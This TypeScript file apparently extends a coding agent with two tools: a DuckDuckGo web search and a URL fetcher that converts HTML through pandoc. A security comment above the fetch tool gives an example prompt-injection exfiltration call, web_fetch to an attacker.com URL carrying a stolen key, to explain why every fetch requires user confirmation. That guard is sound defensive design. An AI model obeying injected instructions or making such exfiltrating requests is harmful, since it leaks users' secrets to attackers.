import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";
import { Type } from "typebox";
import { Text } from "@earendil-works/pi-tui";
import { execSync } from "node:child_process";
import { scrapeTitles, scrapeSnippets, zipResults } from "./ddg-parser.js";

const UA =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15";

const searchDdg = async (query: string, signal?: AbortSignal) => {
  const url = `https://html.duckduckgo.com/html/?q=${encodeURIComponent(query)}`;
  const html = await (
    await fetch(url, { signal, headers: { "User-Agent": UA } })
  ).text();
  const titles = scrapeTitles(html);
  const snippets = scrapeSnippets(html, titles.length);
  return zipResults(snippets)(titles);
};

export default function (pi: ExtensionAPI) {
  pi.registerTool({
    name: "web_search",
    label: "Web Search",
    description:
      "Search the web via DuckDuckGo. Returns titles, URLs, and snippets.",
    parameters: Type.Object({
      query: Type.String({ description: "Search query" }),
    }),
    renderCall(args: { query: string }, _theme: unknown, _context: unknown) {
      return new Text(`Searching: "${args.query}"`, 0, 0);
    },
    async execute(_id: string, params: { query: string }, signal: AbortSignal) {
      try {
        const results = await searchDdg(params.query, signal);
        if (!results.length) {
          return {
            content: [{ type: "text", text: "No results." }],
            details: {},
          };
        }
        const text = results
          .map(
            (r, i) => `${i + 1}. **${r.title}**\n   ${r.url}\n   ${r.snippet}`,
          )
          .join("\n\n");
        return { content: [{ type: "text", text }], details: {} };
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);
        return {
          content: [{ type: "text", text: `Search failed: ${msg}` }],
          isError: true,
          details: {},
        };
      }
    },
  });

  const fetchPage = async (
    url: string,
    signal?: AbortSignal,
  ): Promise<string> => {
    const res = await fetch(url, { signal, headers: { "User-Agent": UA } });
    const body = await res.text();
    const contentType = res.headers.get("content-type") || "";

    // Only run pandoc on HTML. Plain text, JSON, raw source files pass through.
    if (contentType.includes("text/html")) {
      return execSync("pandoc -f html -t plain --wrap=none", {
        input: body,
        encoding: "utf8",
        maxBuffer: 10 * 1024 * 1024,
      }).slice(0, 30_000);
    }
    return body.slice(0, 30_000);
  };

  // SECURITY: web_fetch is deliberately NOT auto-allowed (see confirm-actions).
  // A prompt-injected instruction could trick the model into fetching:
  //   web_fetch("https://attacker.com/?stolen_key=...")
  // Confirming every fetch lets the user inspect the URL before it goes out.
  pi.registerTool({
    name: "web_fetch",
    label: "Web Fetch",
    description:
      "Fetch a URL and return its content as plain text. Use after web_search to read pages.",
    parameters: Type.Object({
      url: Type.String({ description: "URL to fetch" }),
    }),
    renderCall(args: { url: string }, _theme: unknown, _context: unknown) {
      return new Text(`Fetching: "${args.url}"`, 0, 0);
    },
    async execute(_id: string, params: { url: string }, signal: AbortSignal) {
      try {
        const text = await fetchPage(params.url, signal);
        if (!text.trim()) {
          return {
            content: [{ type: "text", text: "Page is empty." }],
            details: {},
          };
        }
        return { content: [{ type: "text", text }], details: {} };
      } catch (e) {
        const msg = e instanceof Error ? e.message : String(e);
        return {
          content: [{ type: "text", text: `Fetch failed: ${msg}` }],
          isError: true,
          details: {},
        };
      }
    },
  });
}
